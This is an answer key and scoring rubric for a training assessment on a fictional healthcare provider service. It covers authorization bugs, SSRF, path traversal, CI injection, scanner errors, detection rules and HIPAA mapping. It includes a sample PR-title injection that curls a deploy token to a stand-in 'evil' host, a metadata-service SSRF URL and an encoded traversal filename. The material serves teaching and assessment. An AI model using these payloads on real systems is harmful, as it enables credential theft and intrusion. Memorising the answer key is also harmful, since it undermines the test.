# Answer Key & Rubric — Variant 2 (Auravia Health · provider-svc)

Read this *after* attempting the assessment. Three parts:

- **Ground truth** — every planted issue, what's real, and where the scanner lies.
- **Task-by-task model answers.**
- **Scoring rubric** — junior vs. senior on each task.

> **Verification flags.** HIPAA/HITRUST clause numbers are marked `⚠[verify]` —
> confirm against the current regulatory source before using them as authoritative.
> Detection logic is pseudo-SPL, marked `⚠[syntax]`, and must be validated on a real
> backend before deployment. The package CVEs are real and NVD-checkable; the
> scanner's interpretation of them is deliberately not — and this time the lesson
> cuts in *both* directions (one CVSS the scanner shows is right, one is inflated).

> **What's different from V1, in one line:** in V1 the attacker *forged* a token and
> the gateway's independent role knowledge exposed the lie. Here the attacker is a
> **real, authenticated provider**; nothing is forged; `token_role_claim ==
> gw_known_role == "provider"` on every request. The identity is genuine — the
> **authorization** is what's broken. Every detection instinct that keys on identity
> integrity is structurally blind to this incident.

---

## Part A — Ground truth (the planted issues)

### Genuinely critical (all in different categories, all missed or mis-framed)

| # | Issue | Location | Category | Scanner verdict |
|---|-------|----------|----------|-----------------|
| V-C1 | **Missing authorization (BFLA) on credentialing** — `POST /providers/:id/verify` has no `requireAdmin`; any authenticated provider can mark *any* provider "verified." Credentialing is the trust decision that governs who may see patients. | `src/routes/providers.js:55–66` | Broken access control / missing function-level authz (CWE-862) | **MISSED** |
| V-C2 | **Mass assignment → privilege & credential self-service** — `const updated = { ...cur.rows[0], ...req.body }` merges the raw body over the record, then writes `role` and `credential_status` back. A provider editing "their contact info" can set their own `role` and mark themselves `verified`. | `src/routes/providers.js:39` (merge) → `:40–45` (UPDATE) | Mass assignment (CWE-915) / improper privilege management (CWE-269) | **MISSED** |
| V-C3 | **SSRF on availability sync** — `axios.get(req.body.source_url)` fetches an attacker-controlled URL server-side; the handler also returns upstream response detail to the caller. Reaches the cloud metadata service. | `src/routes/providers.js:71` (source) → `:75` (fetch) → `:88` (leak) | Server-side request forgery (CWE-918) | **MISSED as SSRF** — only the *symptom* (error leak, line 88) is flagged, LOW |
| V-C4 | **Path traversal on document download** — `path.join(config.docsDir, req.params.id, filename)` with a user-supplied `filename`; returns raw bytes. Reads any file the service user can, including other providers' credentialing PDFs. | `src/routes/documents.js:15` (path) → `:16` (read) → `:24` (send) | Path traversal (CWE-22) | Flagged **MEDIUM** (SAST-101) — **under-rated**, right location |

V-C1 + V-C2 are the credentialing-integrity pair and the heart of the incident.
V-C3 is the crown-jewel escalation (instance IAM credentials). V-C4 is the PHI
document-exfil path. Note the shape: **three of the four worst issues are things
that are *missing* or *merged*, not dangerous calls** — exactly what call-scanning
tools and pattern-matching reviewers skip.

### Severity wrong in one direction or the other

| # | Issue | Location | Scanner said | Truth |
|---|-------|----------|--------------|-------|
| V-S1 | **JWT verified but no algorithm pinning** — `jwt.verify(token, secret)` with no `algorithms: […]`. | `src/middleware/auth.js:14` | **not flagged** | **Real but MEDIUM, and a trap.** The signature *is* checked, so as-wired this is **not a live bypass** — it's latent hardening (matters if an RS256 public key or a second verification path is ever introduced; note `partnerSsoPublicKey` sits right there in config). A junior over-calls this a critical "alg-confusion / `alg:none` bypass." A senior pins the algorithm **and** rates it correctly. |
| V-FP1 | **"Hard-coded credentials"** on `partnerSsoPublicKey`. | `src/config.js:24–25` | **CRITICAL** (SAST-103), the report's single highest-severity finding | **FALSE POSITIVE.** It's an RS256 **public** verification key, explicitly commented as public and non-secret; committing it is normal and correct. Dismiss it. (A real reviewer still sanity-checks it *is* a public key, not a mislabeled private one — it is.) |
| V-S2 | **semver CVE-2022-25883** (ReDoS), real. | `package.json` semver **7.3.5** (direct dep); called at `providers.js:77` | HIGH, `reported_cvss` **7.5**, `reachable: true` | **CVSS is correct** (NVD base **7.5 High**) — *don't reflexively distrust it.* But it's **availability-only** ReDoS (CWE-1333), and the vulnerable sink is `new Range()` on an **untrusted range string**. The app calls `semver.lt(feedVersion, MIN_FEED_VERSION)` on **version** strings, and `feedVersion` comes from the fetched feed's metadata, not a raw attacker range. So `reachable: true` conflates "package imported" with "vulnerable path called." Patch anyway (bump ≥ 7.5.2 — trivial), but it's not a Sev-1 here. |
| V-S3 | **follow-redirects CVE-2023-26159**, real. | `package-lock.json` follow-redirects **1.15.3** (transitive under axios) | HIGH, `reported_cvss` **7.3** | **Over-rated vs NVD.** NVD base is **6.1 Moderate** (some vendors publish 7.3–7.5 — a real provenance discrepancy worth naming). Legit; fix by bumping axios so it resolves follow-redirects ≥ 1.15.4. **The sharp point:** this is the redirect handler axios uses, so it **undercuts a naive host-allowlist fix for V-C3** — an allowlisted host that 30x-redirects to `169.254.169.254` defeats a URL-string allowlist. It's evidence that SSRF must be controlled at egress, not at the input string. |

### Hiding in project metadata (the brief demands you look here)

| # | Issue | Location | Category | Scanner |
|---|-------|----------|----------|---------|
| V-C5 | **CI script injection in a secret-bearing, fork-triggerable workflow** — `${{ github.event.pull_request.title }}` / `.body` are interpolated straight into a `run:` shell step; the job holds `SLACK_WEBHOOK` and `PROVIDER_SVC_DEPLOY_TOKEN`; the trigger is `pull_request_target` (so a fork PR runs with repo secrets in scope). A PR titled `"; curl evil/$PROVIDER_SVC_DEPLOY_TOKEN #` executes on the runner. Compounded by unpinned actions (`auto-labeler@v1` moving tag, `github-script@main`). | `.github/workflows/pr-triage.yml:6, 26–31, 36–37` | Poisoned-pipeline / command injection (CWE-78 + insecure CI) | **MISSED** (despite scope claim) |

This is the highest-severity thing the scanner missed — same lesson as V1's CI
finding, a different anti-pattern (V1 leaked secrets by checking out untrusted head;
V2 executes untrusted input as a shell command). Both live outside application code.

- **Lockfile note (not gradable):** `integrity` hashes are placeholder
  `sha512-EXAMPLEHASH…DoNotTrust…` strings — a kit artifact. A sharp reviewer who
  notices should know real lockfile integrity hashes are the tamper-evidence you'd
  actually rely on. Good instinct, not a planted bug.

### The scanner's 30-second credibility tells (Task 1.3)

1. **`total_findings: 8` but the `findings` array lists 6** — and the severity
   breakdown (`critical 1 + high 2 + medium 1 + low 2`) also sums to **6**. The
   summary contradicts both itself and the data. Don't trust the counts.
2. **`coverage.scope` claims `"CI/CD workflows"` and `"secrets detection"`** — yet
   the workflow script-injection (V-C5) is missed entirely, and the one "secret" it
   *does* report (V-FP1) is a false positive on a public key. The two capabilities it
   advertises loudest are its two worst results.
3. **`analysis.ssrf_detection: true`** — yet the actual SSRF (`providers.js:75`) is
   reported only as a LOW "information exposure" on its error line (88). A tool that
   claims SSRF detection and sees the SSRF handler only as a verbose-error nit is not
   doing what it says on the tin.
4. **`deep_dataflow: true` / `taint_analysis: true`, ruleset `"OWASP Top 10 2021"`** —
   the 2021 list's **#1 is Broken Access Control**, which is exactly the category of
   the two most dangerous misses (V-C1 missing authz, V-C2 mass assignment). The
   ruleset label is current; the coverage isn't. Current-sounding metadata is not
   current coverage.

Any two of these say "input, not verdict."

---

## Part B — Task-by-task model answers

### Task 1 — model ranking

A defensible senior ranking (reorder with justification is fine):

1. **V-C2 — mass-assignment self-escalation.** A provider sets their own `role` /
   `credential_status`. It's the pivot that turns a self-registered account into a
   "verified" clinician and (via role) an admin-shaped principal. Fix: allowlist
   writable fields (`full_name, specialty, email, phone` only); never spread
   `req.body` into the persistence call; require `requireAdmin` for `role` /
   `credential_status`.
2. **V-C1 — missing authz on `/verify`.** Any provider credentials anyone. Even
   without V-C2 it lets an attacker mark sleeper accounts "verified." Fix: wire
   `requireAdmin` (it exists in `middleware/auth.js:30`, just isn't applied) on
   `/verify` and every credentialing route.
3. **V-C3 — SSRF to metadata.** Reaches `169.254.169.254` and returns upstream
   detail → instance IAM credentials, i.e., environment-wide compromise. Fix: no
   raw client URLs; allowlist by **resolved destination at egress**, block
   link-local/RFC1918/CGNAT, strip the upstream detail from the error, and pin
   follow-redirects ≥ 1.15.4 so redirects can't tunnel past the control.
4. **V-C5 — CI script injection.** Executes attacker-controlled PR text with a
   deploy token in scope. Independent path to full supply-chain compromise. Fix:
   never interpolate `github.event.*` into `run:`; pass via `env:` and quote, drop
   `pull_request_target` (or gate on label + no secrets), pin actions to SHAs.
5. **V-C4 — document traversal.** Arbitrary read incl. other providers'
   credentialing PDFs. Fix: `path.basename(filename)`, resolve and confirm the final
   path stays under `docsDir/:id`, reject `..`/encoded traversal.
6. **V-S1 — pin the JWT algorithm** (`algorithms: ['HS256']`). Correct rating:
   medium/hardening, *not* a live bypass today.
7. **V-S3 — follow-redirects bump** (and it's why #3's fix must be egress-based).
8. **V-S2 — semver bump** to ≥ 7.5.2; low practical risk given the call path.
9. **Dismiss V-FP1** (public key) — and say why. Plus **no-helmet** (SAST-104, real,
   low) and the **error-leak** (SAST-102, real, low — but note it's the *tail* of
   V-C3, not a standalone finding).

**Most dangerous single issue:** V-C2 (or a defensible V-C1/V-C2 tie). Two-sentence
version: *"A provider can edit 'their profile' and in the same request set their own
role and mark themselves a verified clinician — the system of record for who's
allowed to see patients is writable by the people it's supposed to gate. It's
already been used to stand up a set of self-verified accounts, and it needs an
allowlist on that update today."* It is **not** the scanner's top finding (that's a
false positive on a public key).

### Task 2 — model answer

**Incident** — attacker IP `45.148.10.7`, one operator, browser-like UA to blend
into provider traffic. New account `user-63314` (registered as `dr.avery.locke` +
four alts), provider IDs `4407–4411`. One afternoon, ~33 minutes end to end.

- **Stage A — 10:05:00–10:05:56, self-registration (entry).** Five `auth.register`
  events from one IP in ~56 s, creating providers 4407–4411 + user accounts. Uses
  the open `POST /auth/register`. *Five signups — well under R1's 10/hr.*
- **Stage B — 10:09:00, self-escalation (V-C2).** `provider.updated` on 4407,
  `actor_role="provider"`, `fields_changed=[…, role, credential_status]`. The
  provider set their own privileged fields via mass assignment.
- **Stage C — 10:11:00–10:14:22, self-credentialing (V-C1).** Five `provider.verify`
  events on 4407–4411, `actor_role="provider"`. No admin role, no forgery — the
  endpoint simply doesn't check. The sleeper set is now "verified."
- **Stage D — 10:20:00–10:21:35, SSRF to metadata (V-C3).** Four `availability.sync`
  events, `source_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/…`,
  `fetch_status=200`. Instance credential theft.
- **Stage E — 10:24:00–10:37:55, document exfiltration (V-C4).** 58 `document.read`
  events, `filename=..%2f..%2f4000%2f<file>.pdf`, one actor, ~15 s pacing, walking
  into other providers' credentialing folders.

**Why the gateway won't hand you this (state it plainly):** on every
`request.forward` for this attacker, `token_role_claim == gw_known_role ==
"provider"`. The account is real; the session is real; the gateway issued it. V1's
"privilege-claim mismatch" signature is **structurally inapplicable** — there is no
mismatch to find. The signal is entirely in the *application's domain events* and in
*behavioral sequence* (a brand-new account self-escalates, self-credentials four
others, then egresses to a metadata IP), not in identity integrity.

Kill chain: **open registration → V-C2 self-escalate → V-C1 self-credential →
V-C3 SSRF/metadata creds → V-C4 document exfil.**

**Per-rule failure analysis (each fails for a different, defensible reason):**

- **R1 (registration abuse):** threshold **> 10 registrations / hour / IP**; the
  attacker made **5 in ~56 s**. Tuned for the volume flood (scrapers do hundreds/hr);
  a surgical five-account signup is a different attack shape and sits under the bar.
  The 2025-01-20 changelog raised it 3→10 for career-fair/residency-intake noise — a
  real, reviewed change. R1 **does** fire on the benign 04:00 scraper burst (35 from
  `192.0.2.77`), which is why the dashboard shows it firing and healthy. Catching the
  incident version means pairing registration with **what the account does next**,
  not counting signups in isolation.
- **R2 (privilege / credential self-change) — this is the reasonable-looking commit.**
  The rule watches `provider.updated` for `role`/`credential_status` in
  `fields_changed` — it would catch V-C2 cleanly. But the **2025-03-11** commit added
  `| where actor_role="admin"`, with the message: *"role/credential_status can only
  be set from the med-staff admin console, so every real change is an admin action…
  scope to admin actors to cut noise."* **That message is the mass-assignment bug
  restated as an assumption.** The PATCH handler is precisely what makes it false: a
  *provider* can set those fields. The incident's self-escalation is
  `provider.updated` with `actor_role="provider"`, discarded by the filter before the
  field match runs. The rule now structurally cannot see the one case that matters.
  Reviewed and approved.
- **R3 (SSRF internal egress):** the internal-IP regex covers RFC1918
  (`10/8, 192.168/16, 172.16/12`) + loopback (`127/8`) but **omits link-local
  `169.254.0.0/16`** — and `169.254.169.254` (the metadata service) is exactly, and
  only, what the attacker hit. It also matches IP-literal hosts only, so a DNS name
  resolving internally (or a redirect — see follow-redirects, V-S3) is never
  evaluated. Every attacker sync targeted the one address outside the pattern, so the
  rule never fired.
- **R4 (document exfil) — silently dead, for a reason unrelated to its logic.** It
  matches traversal on **`resource_path`**, but the **2025-04-09** logging refactor
  renamed that field to **`filename`** (`document.read` no longer emits
  `resource_path`), with no corresponding detection PR. On most backends a match over
  a non-existent field is null/false for every row → **0 fires since the refactor**
  (`last_fired 2025-04-08` in the export). The 58 traversal reads are textbook
  matches for the rule's *intent*; it's looking at a field that no longer exists.
  Secondary trap: even pointed at `filename`, its distinct-provider dedup keys on
  `provider_id`, which stays the attacker's own folder (the traversal lives in
  `filename`), so `dc(provider_id)=1` looks benign — the dedup must key on the
  traversal token, not the ID.

**What the 30-day export shows — two independent ops problems:**

1. **R2 looks *healthy* and is not protecting you — name this trap.** 36 fires / 36
   acknowledged / 0 open, *"fires low and steady, all legit med-staff admin changes."*
   The green is a **consequence of the bug**: the `actor_role="admin"` scope means R2
   only ever sees benign admin changes, so of course it's quiet and fully acked. A
   high-severity rule that is perfectly green because it's scoped away from the attack
   is more dangerous than a noisy one — nobody will ever look at it.
2. **R1 is a growing unworked backlog (alert fatigue as control failure).** 164 fires,
   **88 open-unacknowledged**, queue *"not worked since Jun 2"*; acknowledgments
   collapse to ~0/day after Jun 3 while the open count climbs to 88. A rule that fires
   constantly into an ignored queue is functionally off — a real signal lands unread.
   *Meta-tell:* **R3 has `fires_all_time: 0`** ("assumed no SSRF") and **R4 went
   silent the day after a logging change**. "Never fired" and "went quiet right after
   a commit" are coverage-regression flags, not all-clears.

**Highest-leverage fix: repair R2.** It sits at the earliest stage that is uniquely
the attacker (Stage B self-escalation, 10:09) — before credentialing, SSRF, and
exfil — and the fix is small. Corrected logic ⚠[syntax]:

```
index=provider-svc-app event=provider.updated
| eval changed=mvjoin('fields_changed{}', ",")
| where match(changed, "(^|,)(role|credential_status)(,|$)")
| eval self_edit = if(actor==provider_id, 1, 0)
| eval nonadmin  = if(actor_role!="admin", 1, 0)
| where nonadmin==1 OR self_edit==1          /* the case R2 currently drops */
| stats count, values(provider_id) as targets, values(changed) as fields
      by actor, actor_role, src_ip, _time
```

i.e. **drop the `actor_role="admin"` scope entirely** for these fields; alert on any
privileged-field change by a non-admin, and flag self-edits of privileged fields as
high severity regardless of role. New false positives: legitimate admin console
changes (route those to low/informational — they're a small, known population), and
any API normalization write (scope to the two named fields keeps that tiny). A close
second is **R3** — extend the regex to `169.254.0.0/16` (and `100.64/10`, IPv6
link-local/ULA) *and* move the decision to the destination actually connected to
(egress/flow logs), since the follow-redirects issue means a URL-string check can be
redirected past. Catching Stage D still beats catching nothing, but it's a later,
higher-blast-radius stage than R2's.

### Task 3 — model answer (compliance)

Findings → **HIPAA Security Rule** safeguards. Clause numbers ⚠[verify]:

- **V-C1 + V-C2 (unauthorized credentialing / self-escalation) → Access Control**
  ⚠[verify] *45 CFR § 164.312(a)(1)* and **Person-or-Entity Authentication**
  ⚠[verify] *§ 164.312(d)* — but the sharper mapping is **Integrity** ⚠[verify]
  *§ 164.312(c)(1)*: the record asserting a clinician is cleared to see patients was
  improperly alterable by an unauthorized party, and workforce-authorization
  management ⚠[verify] *§ 164.308(a)(3)/(a)(4)*.
- **V-C3 (SSRF → instance IAM credentials) → Security-management / risk analysis**
  ⚠[verify] *§ 164.308(a)(1)* — theft of the environment's cloud credentials is a
  potential compromise of the controls protecting **all** ePHI, not one record.
- **V-C4 (credentialing-document exfiltration) → Access Control** + a **breach**
  angle: those PDFs (license/DEA/board-cert, NPI) are PHI-adjacent PII → HIPAA
  **Breach Notification** ⚠[verify] *§§ 164.400–414*.
- **V-C5 (CI deploy-token exposure), V-S1 (alg pinning) → Security management /
  integrity of access controls** ⚠[verify] *§ 164.308(a)(1)*.
- **Detection gaps (R1–R4, the R2 false-green, the R1 backlog, R3/R4 silence) →
  Information System Activity Review** ⚠[verify] *§ 164.308(a)(1)(ii)(D)* — the rule
  requires *regularly reviewing* activity records; a rule scoped so it can't see the
  event, an 88-alert unworked queue, and a never-fired high-sev rule are that
  safeguard failing in practice. HITRUST CSF monitoring controls map here ⚠[verify]
  (cite the specific control only after checking).

**Sharpest regulatory teeth — lead with credentialing integrity.** Both the document
exfil (a breach clock) and the SSRF credential theft (environment-wide compromise)
are severe, and a senior names all three. But the finding *unique to this service*
and most alarming to a healthcare customer's auditor is this: **an unauthorized party
could mark clinicians "verified."** For a covered entity, the system of record that
governs *who is permitted to see patients* was writable by an attacker — a
patient-safety and licensing-integrity failure, not merely a privacy one. Carry the
**breach-notification clock** (V-C4's exfiltrated credentialing files) as the
concrete obligation with a deadline; lead the *conversation* with the integrity of
the credentialing decision itself.

**Monitoring gap for a non-engineer:** *"One of our alarms is all-green — it goes off
now and then, every alert gets handled, the dashboard looks perfect. But it was
quietly narrowed to only watch changes made by administrators, so by design it cannot
see the exact thing that happened here: an ordinary user changing their own
permissions. A green light that's green because the camera is pointed at the wrong
door is worse than a red one, because no one thinks to look."* Maps to the
activity-review safeguard ⚠[verify] and HITRUST monitoring ⚠[verify].

### Task 4 — what good looks like

The built-in example is the two dependency CVSS numbers, and they cut *opposite*
ways: the scanner's **7.5 for semver matches NVD** (sometimes the tool is right — a
senior doesn't reflexively distrust every number, but still checks the **call path**:
`semver.lt` on version strings ≠ `new Range` on an untrusted range), while the
scanner's **7.3 for follow-redirects is inflated vs NVD's 6.1**. A strong Task 4 (a)
is specific about where AI was used, (b) names a concrete independent check tied to a
primary source (NVD for both CVEs, and reading the code to confirm the semver call
path), (c) draws the do-not-delegate line at **missing-authorization** bugs — a
reviewer, human or AI, that hunts for dangerous *calls* will not flag an authz check
that simply *isn't there* (V-C1 is the absence of `requireAdmin`; V-C2 is a merge, not
a call) — and (d) states the **PHI rule**: synthetic here, but real credentialing
docs / NPI go into no third-party AI tool without a BAA and data controls. A place AI
would be confidently wrong: over-calling V-S1 the "alg:none bypass," or trusting
`reachable: true` on semver.

---

## Part C — Scoring rubric (junior vs. senior)

Score each task 0–4. **Junior ≈ finds things. Senior ≈ ranks things, catches the
tools, ties it to consequences, and rates the trap correctly instead of over-calling
it.**

### Task 1 — Vulnerability triage
- **0–1:** Re-lists scanner output; trusts its severities; treats the public-key
  CRITICAL as real; misses the missing-authz bugs.
- **2 (junior):** Finds the SSRF and the traversal; may find one of the
  authz/mass-assignment bugs. Ranks roughly by CVSS. Often over-calls V-S1 as a
  critical alg bypass and/or keeps V-FP1.
- **3:** Finds V-C1 *and* V-C2 (the two misses that matter); dismisses V-FP1 with the
  public-vs-private-key reasoning; corrects at least one SCA rating; catches the SSRF
  is only reported as its error symptom.
- **4 (senior):** Context-ranks (credentialing integrity + reachability over raw
  CVSS); catches V-C1, V-C2, and V-C5 (the CI file); rates V-S1 correctly as latent
  hardening *without* over-calling it; gets the **both-directions** SCA lesson (semver
  CVSS right but call-path unproven, follow-redirects inflated **and** it undercuts the
  SSRF allowlist fix); names ≥2 scanner metadata tells incl. the 8-vs-6 count; picks
  the most-dangerous issue in business terms and notes it's not the scanner's top.

### Task 2 — Detection engineering
- **0–1:** Can't locate the incident, or blames "bad rules" generically; still looks
  for a token mismatch.
- **2 (junior):** Reconstructs the incident; finds 1–2 rule gaps (usually R1's
  threshold and R3's regex — the visible ones).
- **3:** All four gaps, each specific; **states why the gateway can't see this**
  (no forgery, roles agree); finds the R2 commit and reads it as the bug-as-assumption;
  spots R4's dead field.
- **4 (senior):** All of the above **plus** reads the export as evidence — names the
  **R2 false-green trap** explicitly and the R1 backlog, and reads "never fired /
  went quiet after a commit" (R3/R4) as coverage regressions; proposes the R2 fix at
  the earliest attacker-unique stage and honestly scopes its new false positives; ties
  the SSRF-detection fix to egress + the follow-redirects redirect problem.

### Task 3 — Compliance mapping
- **0–1:** "It's a HIPAA violation," no safeguard named, or invents confident clause
  numbers.
- **2 (junior):** Maps code bugs to the right safeguard families (access control,
  authentication). Doesn't reach integrity, breach, or monitoring.
- **3:** Includes a detection/monitoring gap as a compliance gap (activity review);
  identifies the breach-notification angle on the document exfil.
- **4 (senior):** Leads with the **credentialing-integrity** angle unique to this
  service; carries the breach clock as the concrete obligation; frames the R2
  false-green for a non-engineer; **flags every unverified clause number** instead of
  bluffing — the honesty is scored.

### Task 4 — AI-usage reflection
- **0–1:** "I didn't use AI," or hand-waves.
- **2 (junior):** Names where AI helped and that they "checked it."
- **3:** Concrete verification tied to a primary source (NVD); a real do-not-delegate
  line.
- **4 (senior):** All that, plus the **both-CVEs** check (noticing they diverge from
  NVD in opposite directions), the missing-authorization limit of call-scanning tools,
  a specific "AI would be confidently wrong here" example, and a clear PHI/BAA rule for
  the real-world version.

**Senior bar overall:** decisive ranking over completeness; tools treated as fallible
inputs (including when a number is *right*); the realization that identity-integrity
detection is blind to authorization abuse; technical findings carried to consequence
(breach clock, credentialing integrity, environment-wide credential theft); and
intellectual honesty about what needs verifying.
